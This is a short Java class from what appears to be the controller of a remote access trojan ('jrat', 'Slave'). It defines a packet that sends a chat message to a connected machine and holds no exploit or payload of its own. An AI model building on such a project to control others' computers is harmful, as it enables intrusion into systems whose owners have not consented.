package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet51ChatMessage implements OutgoingPacket {

	private String message;

	public Packet51ChatMessage(String message) {
		this.message = message;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(message);
	}

	@Override
	public short getPacketId() {
		return 51;
	}

}
